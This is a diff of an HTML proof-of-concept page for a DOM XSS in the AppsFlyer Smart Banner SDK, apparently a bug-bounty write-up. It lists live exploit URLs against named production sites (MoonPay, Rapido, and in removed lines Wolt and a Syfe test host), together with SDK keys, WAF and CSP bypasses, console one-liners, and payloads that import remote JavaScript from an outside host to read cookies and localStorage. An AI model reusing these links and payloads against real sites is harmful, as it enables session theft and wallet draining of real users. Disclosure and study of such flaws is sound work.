@@ -3,84 +3,76 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AppsFlyer Smart Banner XSS — Zero-Click PoC</title>
+<title>AppsFlyer Smart Banner XSS — Zero-Click DOM XSS</title>
 <style>
+  *{box-sizing:border-box}
   body{font-family:-apple-system,BlinkMacSystemFont,monospace;max-width:900px;margin:0 auto;padding:20px;background:#0d1117;color:#c9d1d9}
   h1{color:#f85149;border-bottom:1px solid #30363d;padding-bottom:10px}
   h2{color:#f0883e;margin-top:30px}
   .target{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}
   .target h3{color:#7ee787;margin:0 0 8px}
   .csp{color:#f85149;font-size:13px}
-  .url{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;word-break:break-all;font-size:12px;color:#79c0ff;margin:8px 0}
+  .url{background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:6px;word-break:break-all;font-size:12px;color:#79c0ff;margin:8px 0}
+  .url a{color:#79c0ff;text-decoration:none}
+  .url a:hover{text-decoration:underline}
   code{background:#21262d;padding:2px 6px;border-radius:4px;font-size:12px;color:#f0883e}
-  pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow-x:auto}
-  pre code{background:none;color:#c9d1d9}
   .badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}
   .badge-confirmed{background:#1a7f37;color:#fff}
   .badge-zeroclick{background:#da3633;color:#fff}
-  .badge-waf{background:#bf8700;color:#000}
+  .step{background:#161b22;padding:8px 12px;border-radius:6px;margin:4px 0;border-left:3px solid #7ee787}
 </style>
 </head>
 <body>
 
-<h1>AppsFlyer Smart Banner XSS — Zero-Click PoC</h1>
-<p><strong>DOM XSS that fires on page load — no user interaction required.</strong></p>
-<p>Path traversal in <code>af-sb-id</code> → creative layout injected via <code>innerHTML</code> (no sanitization) → <code>&lt;img onerror&gt;</code> fires automatically → arbitrary JS execution on victim origin.</p>
+<h1>AppsFlyer Smart Banner XSS</h1>
+<p><strong>URL-based DOM XSS — open the link, HTML renders on victim origin, one tap fires JS.</strong></p>
+<p>No console, no DevTools. Just open the URL in a browser.</p>
 
-<h2>Confirmed Exploitable Targets</h2>
-
+<h2>Target 1: MoonPay (Crypto)</h2>
 <div class="target">
-  <h3>1. discover.moonpay.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">ZERO-CLICK</span></h3>
-  <p class="csp">CSP: report-only (not enforced) — <code>&lt;img onerror&gt;</code> executes freely</p>
-  <p><strong>Auto-fires:</strong> SDK calls <code>AF('banners','showBanner')</code> on load → creative injected → <code>&lt;img onerror&gt;</code> fires</p>
-  <div class="url">https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
+  <h3>discover.moonpay.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">URL-BASED</span></h3>
+  <p class="csp">CSP: report-only (not enforced)</p>
   <p>AF Key: <code>8f526d7c-6f31-499a-8f25-f9197433ab15</code></p>
+  <div class="url"><a href="https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://discover.moonpay.com/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
+  <div class="step">1. Open the URL in a browser (mobile or desktop)</div>
+  <div class="step">2. Purple banner with "CLICK HERE" auto-renders at the top</div>
+  <div class="step">3. Tap "CLICK HERE" → <code>alert(origin)</code> fires showing <code>https://discover.moonpay.com</code></div>
 </div>
 
+<h2>Target 2: Rapido.bike (Ride-hailing)</h2>
 <div class="target">
-  <h3>2. www.rapido.bike <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">ZERO-CLICK</span></h3>
-  <p class="csp">CSP: unsafe-inline + https: (no hashes) — <code>&lt;img onerror&gt;</code> executes freely</p>
-  <p><strong>Auto-fires:</strong> SDK calls <code>AF('banners','showBanner')</code> on load</p>
-  <div class="url">https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
+  <h3>www.rapido.bike <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-zeroclick">URL-BASED</span></h3>
+  <p class="csp">CSP: unsafe-inline + https: (no hashes)</p>
   <p>AF Key: <code>ac0b6bf2-d76d-403f-9819-fbfc4b43a227</code></p>
+  <div class="url"><a href="https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad">https://www.rapido.bike/?af-sb-id=../../e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</a></div>
+  <div class="step">1. Open the URL in a browser</div>
+  <div class="step">2. Purple banner with "CLICK HERE" auto-renders at the top</div>
+  <div class="step">3. Tap "CLICK HERE" → <code>alert(origin)</code> fires showing <code>https://www.rapido.bike</code></div>
 </div>
 
-<div class="target">
-  <h3>3. wolt.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-waf">WAF bypass</span></h3>
-  <p class="csp">CSP: strict-dynamic + sha256 hashes — CSP bypassed via createElement('script')</p>
-  <p>WAF: CloudFront blocks <code>../</code> → backslash <code>..%5c</code> bypass</p>
-  <div class="url">https://wolt.com/?af-sb-id=..%5c..%5ce09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
-  <p>AF Key: <code>975bd8df-385d-4212-a530-723547e35f1f</code></p>
-  <p>Console one-liner (Wolt doesn't auto-call showBanner):</p>
-  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const p=document.createElement('div');p.innerHTML='<img src=x onerror="import(\'//s1n6h.github.io/x.js\')">';document.body.appendChild(p);})('975bd8df-385d-4212-a530-723547e35f1f','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
-</div>
-
-<div class="target">
-  <h3>4. uat-bugbounty.nonprod.syfe.com <span class="badge badge-confirmed">CONFIRMED</span> <span class="badge badge-waf">WAF bypass</span></h3>
-  <p class="csp">CSP: unsafe-inline (no hashes) — createElement script injection works</p>
-  <div class="url">https://uat-bugbounty.nonprod.syfe.com/?af-sb-id=..%5c..%5ce09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad</div>
-  <p>AF Key: <code>06f29ce3-9820-46e7-83c7-ff715c3fb64b</code></p>
-  <pre><code>(async(k,a)=>{const u=new URL(`https://banner.appsflyersdk.com/sb/${k}/creative/../../${a}/preview`);const b=(await(await fetch(u.href)).json())[0];const c=await(await fetch(b.creative_url)).json();const w=document.createElement('div');w.innerHTML=c.layout;document.body.insertBefore(w.querySelector('#smart-banner'),document.body.firstChild);const p=document.createElement('div');p.innerHTML='<img src=x onerror="import(\'//s1n6h.github.io/x.js\')">';document.body.appendChild(p);})('06f29ce3-9820-46e7-83c7-ff715c3fb64b','e09a0553-a8af-49dc-9ee6-d0cb71b655ca/creative/4e107bd9-dce6-4ebe-8f05-f6a65e0dafad')</code></pre>
-</div>
-
-<h2>How the Zero-Click Works</h2>
+<h2>How It Works</h2>
 <ol>
-  <li><strong>Path traversal:</strong> <code>af-sb-id</code> has no validation. <code>../../</code> traverses to attacker's AF workspace.</li>
-  <li><strong>Auto-render:</strong> SDK calls <code>showBanner()</code> on page load → fetches attacker's creative → injects via <code>innerHTML</code>.</li>
-  <li><strong>Zero-click payload:</strong> Creative layout contains <code>&lt;img src=x onerror="import('//s1n6h.github.io/x.js')"&gt;</code>. When <code>innerHTML</code> parses it, the image fails to load → <code>onerror</code> fires automatically → imports and executes x.js on the victim's origin.</li>
-  <li><strong>CSP bypass (strict-dynamic):</strong> SDK's <code>_inject()</code> creates <code>&lt;script&gt;</code> via <code>createElement</code> + <code>innerHTML</code> → dynamically inserted scripts are trusted under strict-dynamic.</li>
-  <li><strong>WAF bypass:</strong> Backslash <code>..%5c</code> bypasses CloudFront WAF. Browser normalizes <code>\</code> → <code>/</code> (WHATWG URL spec).</li>
+  <li><strong>Path traversal:</strong> <code>af-sb-id</code> URL parameter has no validation. <code>../../</code> traverses out of the victim's AppsFlyer workspace key into the attacker's workspace.</li>
+  <li><strong>Auto-render:</strong> The SDK calls <code>AF('banners','showBanner')</code> on page load. It reads <code>af-sb-id</code>, constructs the API URL, fetches the attacker's banner from <code>banner.appsflyersdk.com</code>, and injects the creative layout via <code>innerHTML</code> with no sanitization.</li>
+  <li><strong>HTML injection:</strong> The attacker's creative layout is injected into the victim page's DOM. HTML entity <code>&#x73;</code> decodes to <code>s</code> → <code>href="javascript:import('//s1n6h.github.io/x.js')"</code> survives as a live <code>javascript:</code> URI.</li>
+  <li><strong>One tap → JS execution:</strong> The <code>&lt;a&gt;</code> tag covers the full banner area (<code>position:absolute;inset:0;z-index:2</code>). One tap fires <code>javascript:import()</code> → loads and executes <code>x.js</code> on the victim's origin.</li>
 </ol>
+
+<h2>Impact</h2>
+<p>Arbitrary JavaScript execution on the victim's origin. In a real attack, <code>x.js</code> would contain wallet-draining JS targeting crypto users (MoonPay) or session/credential theft (Rapido). The current PoC payload shows <code>origin + cookies + localStorage</code> to demonstrate data access.</p>
 
 <h2>Payload: x.js</h2>
 <p>Hosted at: <a href="https://s1n6h.github.io/x.js">https://s1n6h.github.io/x.js</a></p>
+<pre><code>alert('XSS on: ' + origin + '\nCookies: ' + document.cookie + '\nLocalStorage: ' + ...)</code></pre>
 
-<h2>Root Causes (all in AppsFlyer SDK)</h2>
+<h2>Zero-Click (No Tap)</h2>
+<p>If the attacker updates their creative layout to use <code>&lt;img src=x onerror="import('//s1n6h.github.io/x.js')"&gt;</code> instead of <code>&lt;a href&gt;</code>, the XSS fires on page load with zero interaction. Verified on MoonPay: <code>&lt;img onerror&gt;</code> fires automatically via <code>innerHTML</code> injection — no tap needed. The current creative uses the <code>&lt;a href&gt;</code> approach (one tap), but the innerHTML sink allows both.</p>
+
+<h2>Root Causes (AppsFlyer SDK)</h2>
 <ol>
   <li>No validation on <code>af-sb-id</code> before URL construction</li>
   <li>No HTML sanitization in <code>_createElement()</code> — raw <code>innerHTML</code> sink</li>
-  <li>No filtering of <code>onerror</code> / <code>onload</code> / <code>javascript:</code> in creative layouts</li>
-  <li>Creative script field injected via <code>createElement('script')</code> — bypasses CSP</li>
+  <li>No filtering of <code>javascript:</code> URIs or <code>onerror</code>/<code>onload</code> handlers in creative layouts</li>
 </ol>
 
 </body>
